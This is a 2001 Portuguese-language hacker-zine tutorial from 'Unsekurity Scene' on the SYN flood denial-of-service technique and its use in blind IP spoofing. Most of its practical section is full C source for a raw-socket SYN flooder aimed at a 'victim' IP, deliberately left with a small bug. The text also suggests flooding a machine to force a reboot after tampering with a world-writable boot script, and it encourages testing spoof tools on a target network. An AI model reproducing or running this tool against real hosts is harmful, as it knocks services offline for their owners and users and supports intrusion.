@@ -1,0 +1,417 @@
+##########################################################################
+########################### UNSEKURITY SCENE #############################
+##########################################################################
+
+Desenvolvido por Martin Fallon.
+mar_fallon@yahoo.com.br
+
+Estes e outros artigos podem ser obtidos em:
+http://unsekurity.virtualave.net/
+
+OBS: O Autor nao se reponsabiliza pelos mau uso dos dados e informacoes
+     aqui disponibilizados! Todos os dados e exemplos possuem somente
+     propositos educacionais!
+
+OBS: Elites que se fecham em grupinhos, pseudo-elites que mudam home pages
+     e Analistas de Seguranca desonestos, favor nao ler este artigo! Nao
+     ha nada de util para voces nele!
+
+
+                      *****************************
+                      *   SYN FLOOD - A TECNICA   *
+                      *****************************
+
+
+1 - Introducao
+2 - A tecnica
+    2.1 - A Teoria
+    2.2 - A Pratica
+    2.3 - Utilidades Reais
+3 - Terminando
+    3.1 - Links e Referencias
+    3.2 - Consideracoes Finais
+
+1 - Introducao  
+---------------
+
+Qual o hacker que nao quis executar um "Blind Spoof"??  Synflood eh
+uma tecnica de DoS(Denial of Service) que ficou muito conhecida por conta
+da real "indefesa" que muitos sistemas tinham no que diz respeito a ela!
+Um conceito inteligente que procura explorar uma das inumeras vulnerabilidades 
+do protocolo TCP/IP(usado atualmente na Internet - 2001).
+
+Acredita-se que Kevin David Mitnick usou o synflood em um exploit para
+conseguir implementar com sucesso um blind spoof na rede do "perito"(que
+deixava a porta do finger e servicos r* habilitados) em seguranca Tsutomu
+Shimomura, no final de 1994! Nada comprovado?
+
+Mas a tecnica do SynFlood eh real! E tem suas utilidades! Neste simples
+artigo, pretendo abordar o conceito, mostrando uma visao geral do cenario
+onde esta tecnica pode ser implementada! Nao pretendo abordar aspectos de
+seguranca(ainda nao existe nada 100%), de modo que este material eh voltado
+ao pessoal newbie fucador(unsek scene)! Se voce eh elite ou pseudo-elite,
+favor nao ler, pois perderah seu tempo!
+
+
+2 - A Tecnica
+--------------
+
+Se Mitnick o fez ou nao, isto nao importa! Nos podemos fazer, isso importa!
+Como toda tecnica de DoS, o synflood precisa ser executado com cautela! 
+Olhando sobre a etica realistica, o synflood eh capaz de ser usado para
+prover acesso a sistemas para maior obtencao de conhecimentos, mas tambem
+pode retardar o fluxo de dados, afinal, uma rede ou um host permanecerah
+"dormindo" por alguns instantes! O synflood jamais deve ser usado com o
+unico intuito de "derrubar por derrubar"! Quem faz isso, ou eh cracker ou
+eh lamer! Uma rede ou um host derrubado eh um desperdicio, de recursos,
+de tempo e de conhecimento! Num item mais abaixo, poderemos ver quais as
+reais utilidades que esta tecnica possui para um fucador etico!
+
+
+2.1 - A Teoria
+---------------
+
+O Protocolo TCP/IP usado na Internet foi construido no termino da decada
+de 60! Implementado com sucesso em redes militares, logo se expandiu em
+universidades e mais a frente no que vemos hoje como Internet! O TCP/IP
+foi criado para ser usado sem a necessidade de pensar seriamente em
+seguranca! Muitos dos conceitos, antes revolucionarios e precisos, se
+tornaram furos serissimos de seguranca, capazes de dar um enorme poder
+aos detentores de tal conhecimento e de assustar a todos que se utilizavam
+de tal servico(Internet).
+
+Como nao poderia deixar de ser, os hackers forcaram as coisas! Por volta
+de 1985, Steve Belovin, teorizou e detectou uma serie de problemas
+referentes ao TCP/IP e que em determinados casos poderia ser capaz de gerar
+graves furos de seguranca! O artigo de Belovin parece ter "passado batido",
+pois foi somente com a massificacao da Internet e o crescente numero de
+ataques que medidas de seguranca passaram a ser adotadas! A tecnica de
+Blind Spoof(ainda atual) soh passou a ter popularidade, apos o "incidente"
+com Kevin Mitnick! Hackers!! Sempre eles forcando as coisas para um mundo
+melhor!:)
+
+O synflood explora algumas vulnerabilidades existentes entre o conceito da
+Internet e o esquema com que os sistemas operacionais tratam uma requisicao
+de conexao! Todos que conhecem o basico sobre TCP/IP, sabem que o processo
+inicial de uma conexao se chama "handshake".O handshake, eh o procedimento
+preludio, onde atraves de 3 vias, se pode efetuar o inicio de qualquer
+conexao na internet! Vejamos o diagrama abaixo, onde o host A irah tentar
+abrir uma conexao com o host B:
+
+
+  --------                           --------
+ | Host A | -------- SYN -------- > | Host B |
+  --------                           --------
+  --------                           --------
+ | Host A | < -----SYN+ACK -------- | Host B |
+  --------                           --------
+  --------                           --------
+ | Host A | -------- ACK -------- > | Host B |
+  --------                           --------
+
+O host A solicita conexao atraves do envio de um pacote com o bit SYN
+ativado! Em seguida, o host B responde a solicitacao do Host A enviando
+um pacote com os bits SYN+ACK ativados! Por fim, para terminar o handshake,
+o Host A envia um pacote contendo o bit ACK ativado para o Host B, a partir
+de entao, as duas maquinas estarao conectadas e podem trocar dados entre si!
+
+Abaixando um pouco mais o nivel, para os que desejam praticar Blind Spoof,
+Podemos analisar outro diagrama do handshake abaixo:
+
+
+  Host A                                     Host B
+
+    |                                           |
+    |                                           |
+     --------------- SYN(x) -------------- >    |
+    |                                           |
+    |  < ------ SYN(y),ACK(x+1) --------------- 
+    |                                           |
+    |                                           |
+     --------------- ACK(y+1) ------------ >    |
+
+
+Analisando o modelo do handshake acima, podemos contemplar o "x" e o "y",
+que nada mais sao do que os numeros de sequencia! Eh atraves da descoberta 
+desses numeros de sequencia que se pode efetuar um ataque de Spoof(Blind e 
+Non/Blind).Na verdade, basta para nos predizermos aquele numero "y" para 
+podermos ser bem sucedidos! Requer um pouco de trabalho, mas isso fica para 
+outro tutorial!
+
+Quando se dah inicio a um pedido de conexao, enviamos o SYN para o Host
+alvo, e em seguida, o host alvo nos envia um SYN+ACK! Apos o envio o host
+alvo fica a espera do nosso pacote ACK para que se possa fechar o handshake
+e dar inicio a troca de dados na conexao! Acontece, que este "tempo de
+espera" pelo nosso pacote ACK final do handshake pode nos servir para
+a implementacao de um ataque! Cada implementacao TCP/IP possui um
+tamanho determinado da fila de requisicoes de conexao! Supondo(vulgarmente)
+que um determinado Sistema Operacional tenha uma fila maxima de espera
+pelos ACKs(fechamento do handshake) de 10 conexoes!Se nos enviarmos mais
+de 10 SYNs e nao respondermos com ACKs, a fila ficarah cheia e se alguem
+quiser se conectar terah de esperar ateh que o tempo limite de espera pelo
+ACK termine e um novo espaco esteja disponivel na fila TCP/IP! Eh aqui
+que entra o SYNFLOOD, se enviarmos alguns milhares de SYN para um
+determinado host, e nao respondermos(spoofarmos o IP), mais cedo ou mais
+tarde, a fila irah encher e se alguem quiser se conectar no mesmo, vai ter
+que esperar!                      * fila aqui tem sentido real.
+
+O diagrama abaixo pode facilitar ainda mais nossa compreensao:
+
+
+ ---------------                          -----------
+| Host Atacante |                        | Host Alvo |
+ ---------------                          -----------
+       |                                     (500)
+       |                                       |
+        ---> 100 SYNs -------------- >       (400)
+       |                                       |
+        ---> 200 SYNs -------------- >       (200)
+       |                                       |
+        ---> 300 SYNs -------------- >       (-100)
+
+* Os numeros entre parenteses representam o tamanho atual de uma fila
+  de espera de conexoes.
+
+Podemos notar que o ataque SYNFLOOD acima sobrecarregou o sistema do
+Host Alvo, enviando mais de 100 requisicoes do que a plataforma aguenta.
+Dependendo do Sistema Operacional, da implementacao TCP/IP dele, e de
+outros fatores(Firewall, etc), este ataque pode ser bastante efetivo! 
+
+2.2 - A Pratica
+----------------
+
+Nao existe muito misterio em se floodar uma rede usando SYN-Flood! 
+Programacao basica de Raw Sockets pode nos dar poder para criarmos uma
+ferramenta capaz de executar um SYNFLOOD sem problemas! Como a arquitetura
+Internet(TCP/IP) estah fundamentada no handshake, e este handshake por sua
+vez soh pode ser concretizado com o uso do bit SYN, podemos contemplar que
+se torna muito dificil para um adminitrador de rede "lutar" contra este
+tipo de Denial of Service! Quando implementado com ferramentas distribuidas,
+o SYNFLOOD se torna mais efetivo ainda!
+
+Abaixo nos podemos ver um exemplo de um programa executor de SYNFLOOD.
+
+
+------------------------------- syn2002.c ------------------------------
+/* Programa SYN-FLOOD - Projeto Spoof/2002 Unsekurity Scene.
+ * Desenvolvido por Martin Fallon(mar_fallon@yahoo.com.br)
+ * Este programa faz parte de um projeto de descricao pormenorizada
+ * de todas as tecnicas de IP Spoof amplamente difundidas.
+ * Caso queira colaborar, favor entrar em contato com a Unsekurity Scene.
+ * http://unsekurity.virtualave.net/
+ * Thanks a todos da Unsekurity Scene.
+ * OBS: Este codigo tem um pequeno erro para desencorajar script kiddies!
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <string.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <linux/ip.h>
+#include <linux/tcp.h>
+#include <netdb.h>
+
+#define NUM_PACOTES    10000
+#define ERRO              -1
+
+/* Funcao flood e checksum */
+
+int flood(unsigned short porta, unsigned int hacker, unsigned int vitima);
+unsigned short in_cksum (unsigned short *end, int tamanho);
+
+int main(int argc, char *argv[]) {
+unsigned int num_pacotes = NUM_PACOTES;
+int i;
+unsigned int porta;
+
+if(argc < 3) {
+printf("***************************************************************\n");
+printf("*****  Projeto Spoof/2002 - SYNFLOOD by Martin Fallon   ******\n");
+printf("***************************************************************\n");
+printf("\nUso: %s <ip_origem> <ip_vitima> <porta> num_pacote\n",argv[0]);
+exit(0);
+}
+
+/* Necessita ser root para usar RAW SOCKS em muitos sistemas! */
+
+if(geteuid() != 0) {
+fprintf(stderr,"Erro: necessita ser root!!\n");
+exit(ERRO);
+}
+
+if (argc = 4)   porta = atoi(argv[3]);
+if (argc = 5)   num_pacotes =  atoi(argv[4]); 
+
+for(i = 0; i < num_pacotes; i++) {
+flood(porta, inet_addr(argv[1]), inet_addr(argv[2]));
+printf(".");
+}
+puts("\n");
+printf("Pacotes Enviados com Sucesso!!\n");
+printf("Unsekurity Scene - A Cena Hacker Brasileira!!!!\n\n");
+return 0;
+}
+
+int flood(unsigned short porta, unsigned int hacker, unsigned int vitima){
+
+   struct tcphdr meu_tcp;
+
+/* Pseudo Header para manipular enderecos */
+
+   struct pseudo_header {
+      unsigned int source_address;
+      unsigned int dest_address;
+      unsigned char placeholder;
+      unsigned char protocol;
+      unsigned short tcp_length;
+      struct tcphdr tcp;
+   }pseudo_header;
+
+   int Meusocket;
+   struct sockaddr_in alvo;
+   int tam_alvo;
+   static int blah = 0;
+
+   blah++;
+
+
+meu_tcp.source = getpid() + blah;
+meu_tcp.dest = htons(porta);
+meu_tcp.seq = getpid() + blah;
+meu_tcp.ack_seq = 0;
+meu_tcp.res1 = 0;
+meu_tcp.doff = 5;
+meu_tcp.res2 = 0;
+meu_tcp.fin = 0;
+meu_tcp.syn = 1; /* Bit SYN ativado */
+meu_tcp.rst = 0;
+meu_tcp.psh = 0;
+meu_tcp.ack = 0;
+meu_tcp.urg = 0;
+meu_tcp.window = htons(512);
+meu_tcp.check = 0;
+meu_tcp.urg_ptr = 0;
+
+pseudo_header.source_address = hacker;
+pseudo_header.dest_address = vitima;
+pseudo_header.placeholder = 0;
+
+pseudo_header.protocol = IPPROTO_TCP;
+pseudo_header.tcp_length = htons(20);
+bcopy(&meu_tcp, &pseudo_header.tcp, 20);
+meu_tcp.check = in_cksum((unsigned short *)&pseudo_header, 32);
+
+alvo.sin_family = AF_INET;
+alvo.sin_port = htons(porta);
+alvo.sin_addr.s_addr = vitima;
+tam_alvo=sizeof(alvo);
+
+
+Meusocket = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
+if(Meusocket < 0){
+ fprintf(stderr, "Nao pode abrir raw socket!\n");
+ exit(1);
+}
+
+/* sendto() envia nosso pacote construido. */
+
+sendto(Meusocket, &meu_tcp, 20, 0, (struct sockaddr *)&alvo,tam_alvo);
+return 0;
+}
+
+/* Checksum */
+
+unsigned short in_cksum(unsigned short *end, int tamanho)
+{
+register long           sum;
+u_short                 oddbyte;
+register u_short        answer;
+
+sum = 0;
+        while (tamanho > 1)  {
+        sum += *end++;
+        tamanho -= 2;
+        }
+        if (tamanho == 1) {
+        oddbyte = 0;
+        *((u_char *) &oddbyte) = *(u_char *)end;
+        sum += oddbyte;
+        }
+
+sum  = (sum >> 16) + (sum & 0xffff);
+sum += (sum >> 16);
+answer = ~sum;
+return(answer);
+}
+
+-----------------------------------------------------------------------
+
+
+Cada sistema operacional pode responder de um jeito! Alguns, apenas o
+daemon(servico alvo) cai! Outros, o sistema trava! Alguns executam
+"saltos", ou seja, detectam o SYNFLOOD e tentam fugir dele! Enfim, varia,
+mas geralmente pode-se ser sucedido!
+
+
+2.3 - Utilidades Reais
+------------------------
+
+Como jah foi dito, o SYNFLOOD nao deve ser executado com o mero intuito de
+"derrubar para prejudicar".A ideia eh a implementacao de tecnicas Spoof
+mais avancadas como Blind/NonBlind Spoof! Acreditem, estamos em 2001 e
+ainda eh possivel executarmos estas tecnicas em varios sistemas!
+
+Temos que ter conciencia que esta tecnica nao deve ser usada por
+divertimento! O hacking eh coisa seria, e como todos devem saber, eh
+bastante perigoso! A utilidade do SYNFLOOD pode ir mais alem, em alguns
+casos, se requer que derrubemos a maquina para executar algo.. um exemplo
+eh um bug no Red Hat Apolo onde um arquivo de configuracao do /etc/rc.d
+tem permissao de escrita para todo mundo! Um usuario que obteve shell
+comum(nao root) neste sistema pode sobrescrever este arquivo e atraves do
+SYNFLOOD forcar a reinicializacao da maquina! Este tipo de cenario eh
+bastante comum em ambientes Windows NT.
+
+3 - Terminando 
+---------------
+
+Mais um artigo basico para o pessoal NewBie Fucador! Juizo na execucao
+desta tecnica! Entenda a teoria e poderah contemplar maiores esquemas na
+implementacao dela!
+
+
+3.1 - Links e Referencias
+--------------------------
+
+http://unsekurity.virtualave.net/txts/socketsII.txt
+http://phrack.infonexus.com/  - "IP-spoofing Demystified"
+http://packetstorm.securify.com/papers/protocols/ipext.ps
+
+3.2 - Consideracoes Finais
+---------------------------
+
+Estou iniciando um projeto duradouro que visa criar ferramentas proprias
+para todo tipo de Spoof! Isso mesmo! Sabemos que eh algo complexo e
+trabalhoso, por isso estamos estipulando um prazo gigantesco! Por que de
+se fazer isso??? - Aprendizado!!
+
+Eu jah tive o prazer de usar muitas ferramentas de spoof! Em varias ateh
+cheguei a ter que alterar o fonte para funcionar perfeitamente! Mas eu
+nao estou satisfeito, afinal, qualquer um pode fazer isso(executar
+ferramenta dos outros), de modo que pretendo ir mais fundo nesse conceito!
+
+Ha muito a se dizer sobre Spoof, e espero em breve poder ir liberando mais
+material! Existem varias ferramentas publicas e se voce quiser ter uma
+ideia da pratica, pode testa-la em uma rede alvo!
+
+Agradeco a todo pessoal da Unsekurity Scene! E espero que mais e mais
+pessoas sintam a necessidade e se tornem concientes do aprendizado do
+hacking etico!
+
+Um Abraco a Todos.
+
+Martin Fallon.
+
